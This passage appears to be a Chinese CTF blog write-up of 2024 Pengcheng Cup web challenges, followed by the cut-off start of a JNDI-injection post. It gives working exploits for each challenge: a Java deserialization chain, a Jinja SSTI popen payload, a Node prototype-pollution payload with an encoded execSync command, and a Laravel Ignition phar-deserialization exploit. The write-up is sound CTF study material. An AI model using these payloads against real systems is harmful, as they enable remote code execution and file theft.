kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashSet, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz1</span> <span class="hljs-operator">=</span> bad.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz1.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(bad,pojoNode);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b1);<br>        o1.writeObject(bad);<br>        o1.close();<br><br>        System.out.println(Base64.getEncoder().encodeToString(b1.toByteArray()));<br><br><span class="hljs-comment">//        ByteArrayInputStream b2 = new ByteArrayInputStream(b1.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream o2 = new MyInputstream(b2);</span><br><span class="hljs-comment">//        o2.readObject();</span><br><span class="hljs-comment">//        o2.close();</span><br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241113201326361.png" alt="image-20241113201326361"></p><h2 id="python口算"><a href="#python口算" class="headerlink" title="python口算"></a>python口算</h2><p>首先用脚本算出答案提交，得到hint：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">solved=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> current_expr<br><br>    <span class="hljs-comment"># 前端计算</span><br>    .....<br>    .....<br>    <span class="hljs-comment"># 通过计算</span><br><br>    username = <span class="hljs-string">&#x27;ctfer!&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">if</span> whitelist_filter(username,whitelist_patterns):<br>            <span class="hljs-keyword">if</span> blacklist_filter(username):<br>                <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你过关！&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="hljs-string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)<br></code></pre></td></tr></table></figure><p>修改脚本直接打SSTI。</p><p>好像waf就过滤了我payload中的空格，过滤少了，直接就出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_expression</span>(<span class="hljs-params">url</span>):<br>    response = requests.get(url)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> response.text.strip()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to fetch expression. Status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_and_submit</span>(<span class="hljs-params">expression, submit_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        result = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error evaluating expression: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    payload = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$&#123;IFS&#125;/flag&#x27;).read()&#125;&#125;&quot;</span><br>    response = requests.post(url=submit_url + <span class="hljs-string">f&quot;?&amp;answer=<span class="hljs-subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;</span>, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload&#125;)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Successfully sent the answer.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to send the answer. Status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># URL to fetch the expression</span><br>url = <span class="hljs-string">&quot;http://192.168.18.28/calc&quot;</span><br><br><span class="hljs-comment"># Fetch the expression</span><br>expression = fetch_expression(url)<br><span class="hljs-keyword">if</span> expression:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Fetched expression: <span class="hljs-subst">&#123;expression&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># URL to submit the result</span><br>    submit_url = <span class="hljs-string">&quot;http://192.168.18.28/&quot;</span><br>    calculate_and_submit(expression, submit_url)<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109123947868.png" alt="image-20241109123947868"></p><h2 id="notadmin"><a href="#notadmin" class="headerlink" title="notadmin"></a>notadmin</h2><p>审计源码发现merge逻辑，想到原型链污染，先污染secretKey，然后本地制作一个token，然后再打code的原型链污染执行代码，由于blacklist里 + 被ban了，所以base64凭借绕过的时候也需要考虑编码里有无加号。</p><p>本地制作username为admin和key为admin的jwt：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154211359.png" alt="image-20241109154211359"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">res = requests.post(url+<span class="hljs-string">&quot;/login&quot;</span>, json=&#123;<br>    <span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjYXQgLyogPj4vYXBwL3ZpZXdzL2xvZ2luLmVqcyIp`,`bas`.concat(`e64`)).toString())&quot;</span>,<br>        <span class="hljs-string">&quot;secretKey&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>base64中的命令为：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154523192.png" alt="image-20241109154523192"></p><p>然后带token访问：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">res = requests.get(url, headers=&#123;<span class="hljs-string">&quot;authorization&quot;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzMxMTM4MTIwfQ.xhWbYZSufvhAnxhOdLPORZCJ05F9HSmuQUHV9tzw364&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>第一次访问污染secretKey，第二次访问带token执行code，将根目录文件写入&#x2F;app&#x2F;views&#x2F;login.ejs前端文件，然后网页查看，已经有flag了：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154711254.png" alt="image-20241109154711254"></p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154722012.png" alt="image-20241109154722012"></p><h2 id="ezlaravel"><a href="#ezlaravel" class="headerlink" title="ezlaravel"></a>ezlaravel</h2><p>用Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数构造恶意Log文件触发Phar反序列化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AA&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=2B=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=49=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=54=00=49=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=47=00=5A=00=70=00=62=00=47=00=56=00=66=00=63=00=48=00=56=00=30=00=58=00=32=00=4E=00=76=00=62=00=6E=00=52=00=6C=00=62=00=6E=00=52=00=7A=00=4B=00=43=00=64=00=6B=00=62=00=33=00=55=00=7A=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=63=00=73=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=4A=00=31=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=54=00=4A=00=4F=00=61=00=6C=00=6B=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6C=00=57=00=45=00=34=00=77=00=57=00=6C=00=63=00=77=00=62=00=30=00=6C=00=74=00=65=00=48=00=70=00=4A=00=51=00=7A=00=68=00=70=00=53=00=31=00=52=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=33=00=68=00=4E=00=61=00=6B=00=35=00=6B=00=53=00=31=00=52=00=30=00=64=00=32=00=46=00=49=00=51=00=6E=00=42=00=69=00=62=00=56=00=70=00=32=00=53=00=30=00=4E=00=72=00=4E=00=30=00=6C=00=45=00=4F=00=43=00=73=00=6E=00=4B=00=53=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=59=00=67=00=49=00=76=00=5A=00=77=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=6F=00=35=00=62=00=7A=00=42=00=2F=00=4C=00=76=00=47=00=6D=00=74=00=78=00=42=00=2B=00=4B=00=4E=00=7A=00=58=00=43=00=38=00=4B=00=78=00=37=00=43=00=4D=00=42=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;phar://../storage/logs/laravel.log&quot;</span>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/b79752336362524ae7976d7fdf8e981b.png" alt="img"></p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109161440626.png" alt="image-20241109161440626"></p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>纯sb题。</p><p>&#x2F;login有路由，弱密码<code>test/123456</code>登录，拿到jwt-token。</p><p>爆破密钥得到a123456。。。。懒得喷。</p><p>得到弹窗：</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241113200902181.png" alt="image-20241113200902181"></p><p>&#x2F;ser打pickle反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle <br><span class="hljs-keyword">import</span> base64 <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hhhhackme</span>(<span class="hljs-params">pickled</span>): <br>    data = base64.urlsafe_b64decode(pickled) <br>    deserialized = pickle.loads(data) <br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">204</span><br></code></pre></td></tr></table></figure><p>没有过滤，随便打。raise Exception抛错或者反弹shell都可以。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>犹记得前几个月的羊城杯我们能本科组第二，学长ak靶场本科组第一。还以为这次原班人马能再续辉煌。</p><p>但是很难以评价的赛事安排，跟网鼎杯决赛撞了，所以这次线下去不了了。</p><p>再见广东。再见深圳。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于2024GeekCon_AVSS-oldlog的JDK高版本JNDI注入分析</title>
    <link href="/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <url>/2024/10/30/%E5%9F%BA%E4%BA%8E2024GeekCon-AVSS-oldlog%E7%9A%84JDK%E9%AB%98%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是从一些题目看到了这个的影子，所以想借此学习一下JDK17的原生和JDK21的JNDI等等，也算是做一个记录。而且好久都没更博客了，这学期实验太多导致的（</p><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>首先是我遇到了某个CTF里出的这道题目：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">var</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(System.getenv().getOrDefault(<span class="hljs-string">&quot;PORT&quot;</span>, <span class="hljs-string">&quot;8000&quot;</span>));<br>        <span class="hljs-type">var</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.InetSocketAddress(port), <span class="hljs-number">0</span>);<br>        server.createContext(<span class="hljs-string">&quot;/&quot;</span>, req -&gt; &#123;<br>            <span class="hljs-type">var</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>            <span class="hljs-type">var</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> 